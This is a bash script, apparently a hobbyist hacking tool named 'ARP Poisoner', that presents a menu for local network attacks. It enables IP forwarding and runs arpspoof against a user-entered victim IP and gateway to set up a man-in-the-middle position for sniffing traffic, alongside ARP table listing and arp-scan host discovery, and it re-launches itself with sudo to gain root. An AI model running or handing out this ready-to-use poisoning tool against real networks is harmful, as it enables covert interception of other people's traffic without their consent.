#!/usr/bin/bash

# ▄▄▄       ██▀███   ██▓███      ██▓███   ▒█████   ██▓  ██████  ▒█████   ███▄    █ ▓█████  ██▀███  
#▒████▄    ▓██ ▒ ██▒▓██░  ██▒   ▓██░  ██▒▒██▒  ██▒▓██▒▒██    ▒ ▒██▒  ██▒ ██ ▀█   █ ▓█   ▀ ▓██ ▒ ██▒
#▒██  ▀█▄  ▓██ ░▄█ ▒▓██░ ██▓▒   ▓██░ ██▓▒▒██░  ██▒▒██▒░ ▓██▄   ▒██░  ██▒▓██  ▀█ ██▒▒███   ▓██ ░▄█ ▒
#░██▄▄▄▄██ ▒██▀▀█▄  ▒██▄█▓▒ ▒   ▒██▄█▓▒ ▒▒██   ██░░██░  ▒   ██▒▒██   ██░▓██▒  ▐▌██▒▒▓█  ▄ ▒██▀▀█▄  
# ▓█   ▓██▒░██▓ ▒██▒▒██▒ ░  ░   ▒██▒ ░  ░░ ████▓▒░░██░▒██████▒▒░ ████▓▒░▒██░   ▓██░░▒████▒░██▓ ▒██▒
# ▒▒   ▓▒█░░ ▒▓ ░▒▓░▒▓▒░ ░  ░   ▒▓▒░ ░  ░░ ▒░▒░▒░ ░▓  ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
# ▒   ▒▒ ░  ░▒ ░ ▒░░▒ ░        ░▒ ░       ░ ▒ ▒░  ▒ ░░ ░▒  ░ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░ ░ ░  ░  ░▒ ░ ▒░
# ░   ▒     ░░   ░ ░░          ░░       ░ ░ ░ ▒   ▒ ░░  ░  ░  ░ ░ ░ ▒     ░   ░ ░    ░     ░░   ░ 
#     ░  ░   ░                              ░ ░   ░        ░      ░ ░           ░    ░  ░   ░     
# Developed by HHY

#font
bold=$(tput bold)
normal=$(tput sgr0)

#colors                                                                                        
NC='\033[0m'
Red='\033[0;91m'
Cyan='\033[0;96m'
Green='\033[0;92m'
Purple='\033[0;95m'

#loading animation
 spinner() {
	local i sp n
	sp='/-\|'
	n=${#sp}
	printf ' '
	while sleep 0.1; do
		printf "%s\b" "${sp:i++%n:1}"
	done
	
}


#forcing running as root-----------------------------------------------------------------------
root() {	 
 clear
 if [ "$EUID" -ne 0 ]
	 
  then echo -e "${Red}${bold}Not running as root...${NC}${normal}";
  echo "" ;
  sudo "$0" "$@"
  exit
  fi
}
#requirements-------------------------------------------------------------------
requirements() {
echo -e "${Green}${bold}Checking the requirements...${NC}${normal}";
 
  spinner&
        
        sleep 3

  kill "$!"
  clear
 echo -e "${Green}${bold}Upgrading Net-Tools...${NC}${normal}";
 sleep 1
 echo
 echo -e "${Green}${bold}Downloading Sniffing Tools...${NC}${normal}";

  chmod +x ./requirements.sh
  sudo apt install xterm
  sudo ./requirements.sh
  clear
 echo

 echo -e "${Green}${bold}Enabling IP Forwarding...${NC}${normal}"; 
 sudo echo 1 > /proc/sys/net/ipv4/ip_forward	

spinner&
	sleep 3
	kill "$!"
 
}
#Print Net-Stats----------------------------------------------------------
netstats() {
 printf "${Purple}"
 echo
 echo
 echo -e "${bold}----[Net-Stats]----"
 echo
 sudo ip addr | awk '
/^[0-9]+:/ { 
  sub(/:/,"",$2); iface=$2 } 
/^[[:space:]]*inet / { 
  split($2, a, "/")
  print iface" : "a[1] 
}'

 IP=$(/sbin/ip route | awk '/default/ { print $3 }')
 echo "Default Gateway : $IP ${normal}"
 

echo
}

backmenu() {
read -r -p 'Press 1 to return to main menu...' responsecl
			  echo    
			  case "$responsecl" in 
			  ([1])
                           clear
			  main
			  ;;
			 *)

			  echo "U stoopid ?...i said 1" 
                           sleep 2
                           clear
                           main
                           esac
}
#------------------------------------------------------------------------------------ 
main() {
   chmod +x ./banner.sh
  ./banner.sh

  netstats

#Menu---------------------------------------------
printf "${Purple}${bold}"
PS3=': '
options=("Poison" "Arp Table" "Hosts Scan" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Poison")
            clear
            echo -e "${Purple}${bold}Poisoning ARPs...${normal}";
            echo
         spinner&
	 sleep 2
	 kill "$!"
         clear
         ./banner.sh

         netstats
         printf "${Purple}${bold}"
         read -p 'Interface: ' inter
         echo
         read -p 'Victim IP: ' vict
         echo
         read -p 'Default Gateway: ' gate
         echo
         echo "Stop sniffing...U addicted as hell!"
         sudo arpspoof -i $inter -t $vict -r $gate 
         wait
         echo
         backmenu
            ;;

        "Arp Table")
           clear
           echo -e "${Purple}${bold}Caching ARPs...${normal}";

         echo
         spinner&
	 sleep 2
	 kill "$!"

         clear
         ./banner.sh

         netstats
       
         printf "${Purple}${bold}"
         sudo arp -a 
         echo
         backmenu
         
            ;;

        "Hosts Scan")
            clear
            echo -e "${Purple}${bold}Scanning for Hosts...${normal}";

            echo
         spinner&
	 sleep 2
	 kill "$!"
         clear
         ./banner.sh
         netstats
         printf "${Purple}${bold}"
         read -p 'Interface: ' scanint
         echo
         sudo arp-scan --interface=$scanint --localnet
         echo
         wait
         echo
         backmenu
           ;;

        "Quit")
            clear
            exit
            ;;

        *) clear
           echo "Invalid option...Reboot"
           sleep 2
           clear
           main
           ;;
    esac
done

}

   root
   requirements	   
   clear
   main
